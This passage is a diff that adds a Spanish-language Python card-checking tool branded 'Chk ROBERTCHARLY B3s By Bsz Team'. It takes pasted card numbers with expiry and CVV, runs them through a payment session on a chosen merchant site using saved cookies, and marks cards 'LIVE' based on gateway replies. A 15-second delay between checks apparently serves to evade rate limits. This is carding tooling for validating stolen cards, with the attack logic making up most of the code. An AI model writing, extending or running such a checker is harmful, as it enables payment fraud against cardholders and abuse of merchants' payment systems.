+            live_other = any(key in msg for key in live_keywords)
+            
+            if cvv_incorrect or live_other:
+                return {"status": "approved", "response": f"LIVE - {msg}", "card": f"{cc}|{mm}|{yy}|{cvv}"}
+            else:
+                return {"status": "declined", "response": msg, "card": f"{cc}|{mm}|{yy}|{cvv}"}
+                
+    except Exception as e:
+        return {"status": "error", "response": str(e), "card": f"{cc}|{mm}|{yy}|{cvv}"}
+
+def wait_for_double_press():
+    """Espera a que el usuario presione Enter dos veces"""
+    print(f"\n{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}       Chk ROBERTCHARLY B3s By Bsz Team{Color.RESET}")
+    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}\n")
+    print(f"{Color.YELLOW}Presiona ENTER dos veces para comenzar...{Color.RESET}\n")
+    
+    input(f"{Color.CYAN}Primera presion >>> {Color.RESET}")
+    print(f"{Color.GREEN}✓ Primera confirmacion recibida{Color.RESET}")
+    time.sleep(0.3)
+    
+    input(f"{Color.CYAN}Segunda presion >>> {Color.RESET}")
+    print(f"{Color.GREEN}✓ Segunda confirmacion recibida{Color.RESET}\n")
+    time.sleep(0.3)
+
+def read_cards_multiline():
+    """Lee múltiples tarjetas"""
+    print(f"{Color.BOLD}{Color.BLUE}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}PEGA TUS TARJETAS{Color.RESET}")
+    print(f"{Color.BOLD}{Color.BLUE}{'='*60}{Color.RESET}")
+    print(f"\n{Color.YELLOW}Formato: CC|MM|YYYY|CVV{Color.RESET}")
+    print(f"{Color.WHITE}Ejemplo: 4111111111111111|12|2025|123{Color.RESET}\n")
+    print(f"{Color.WHITE}Pega las tarjetas (una por linea){Color.RESET}")
+    print(f"{Color.WHITE}Enter en linea vacia para terminar{Color.RESET}\n")
+    print(f"{Color.BLUE}{'-'*60}{Color.RESET}")
+    
+    cards_input = []
+    while True:
+        try:
+            line = input()
+            if line.strip() == "":
+                break
+            cards_input.append(line.strip())
+        except EOFError:
+            break
+    
+    return cards_input
+
+def parse_cards(cards_input):
+    """Parsea las tarjetas"""
+    cards = []
+    for idx, card_str in enumerate(cards_input, 1):
+        try:
+            parts = card_str.split('|')
+            if len(parts) != 4:
+                print(f"{Color.RED}Linea {idx} ignorada (formato inválido): {card_str}{Color.RESET}")
+                continue
+                
+            cc, mm, yy, cvv = parts
+            cc = cc.replace(" ", "")
+            
+            if len(yy) == 2:
+                yy = str(2000 + int(yy) if int(yy) < 40 else 1900 + int(yy))
+            
+            cards.append((cc, mm, yy, cvv))
+            
+        except Exception as e:
+            print(f"{Color.RED}Linea {idx} ignorada (error): {card_str}{Color.RESET}")
+    
+    return cards
+
+def run_checker():
+    """Ejecuta el checker"""
+    web = get_current_web()
+    print(f"\n{Color.CYAN}🌐 Usando web seleccionada: {web}{Color.RESET}")
+    
+    try:
+        session, current_web = initialize_session(web)
+    except SystemExit:
+        return
+    except Exception as e:
+        print(f"{Color.RED}❌ Error al inicializar: {str(e)}{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    wait_for_double_press()
+    
+    cards_input = read_cards_multiline()
+    
+    if not cards_input:
+        print(f"\n{Color.RED}No se ingresaron tarjetas{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    print(f"\n{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}PROCESANDO TARJETAS...{Color.RESET}")
+    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
+    
+    cards = parse_cards(cards_input)
+    
+    if not cards:
+        print(f"\n{Color.RED}No hay tarjetas válidas{Color.RESET}")
+        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+        return
+    
+    print(f"\n{Color.GREEN}✓ Tarjetas válidas: {len(cards)}{Color.RESET}")
+    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}INICIANDO VERIFICACIÓN{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.YELLOW}⏱️  Espera de 15 segundos entre verificaciones{Color.RESET}")
+    
+    time.sleep(0.5)
+    
+    results = []
+    approved = 0
+    declined = 0
+    errors = 0
+    
+    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
+        result = check_card(session, current_web, cc, mm, yy, cvv, idx, len(cards))
+        results.append(result)
+        
+        if result['status'] == 'approved':
+            print(f"{Color.BOLD}{Color.GREEN}✅ LIVE ✅ {result['card']} - {result['response']}{Color.RESET}")
+            approved += 1
+        elif result['status'] == 'declined':
+            print(f"{Color.BOLD}{Color.RED}❌ DECLINED ❌ {result['card']} - {result['response']}{Color.RESET}")
+            declined += 1
+        else:
+            print(f"{Color.BOLD}{Color.YELLOW}⚠️  ERROR ⚠️  {result['card']} - {result['response']}{Color.RESET}")
+            errors += 1
+        
+        if idx < len(cards):
+            print(f"{Color.CYAN}⏳ Esperando 15 segundos...{Color.RESET}")
+            time.sleep(15)
+    
+    print(f"\n{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}RESUMEN FINAL{Color.RESET}")
+    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
+    print(f"{Color.GREEN}✅ LIVE: {approved}{Color.RESET}")
+    print(f"{Color.RED}❌ Declined: {declined}{Color.RESET}")
+    print(f"{Color.YELLOW}⚠️  Errores: {errors}{Color.RESET}")
+    print(f"{Color.CYAN}📊 Total: {len(cards)}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}\n")
+    
+    input(f"\n{Color.YELLOW}Presiona Enter para volver al menú...{Color.RESET}")
+
+def show_menu():
+    """Muestra el menú principal"""
+    show_banner()
+    
+    current_web = get_current_web()
+    cookies_list = load_all_cookies()
+    
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.BOLD}{Color.WHITE}              MENÚ PRINCIPAL{Color.RESET}")
+    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
+    print(f"{Color.GREEN}🌐 Web actual: {Color.WHITE}{current_web}{Color.RESET}")
+    print(f"{Color.CYAN}📁 Cookies guardadas: {Color.WHITE}{len(cookies_list)}{Color.RESET}")
+    print(f"{Color.CYAN}{'-'*60}{Color.RESET}")
+    print(f"{Color.GREEN}[1]{Color.RESET} {Color.WHITE}Gestionar Cookies (Agregar/Seleccionar/Editar/Eliminar){Color.RESET}")
+    print(f"{Color.GREEN}[2]{Color.RESET} {Color.WHITE}Gestionar Webs (Agregar/Seleccionar/Editar/Eliminar){Color.RESET}")
+    print(f"{Color.GREEN}[3]{Color.RESET} {Color.WHITE}RUN CHECKER (usar web actual){Color.RESET}")
+    print(f"{Color.GREEN}[4]{Color.RESET} {Color.WHITE}Salir{Color.RESET}")
+    print(f"{Color.CYAN}{'='*60}{Color.RESET}")
+    
+    try:
+        choice = input(f"\n{Color.CYAN}Selecciona una opción >>> {Color.RESET}").strip()
+        return choice
+    except:
+        return "4"
+
+def main():
+    while True:
+        choice = show_menu()
+        
+        if choice == "1":
+            manage_cookies()
+        elif choice == "2":
+            manage_webs()
+        elif choice == "3":
+            run_checker()
+        elif choice == "4":
+            print(f"\n{Color.GREEN}✓ Saliendo del programa...{Color.RESET}")
+            print(f"{Color.CYAN}Chk ROBERTCHARLY B3s By Bsz Team{Color.RESET}")
+            break
+        else:
+            print(f"{Color.RED}❌ Opción inválida{Color.RESET}")
+            input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
+
+if __name__ == "__main__":
+    main()
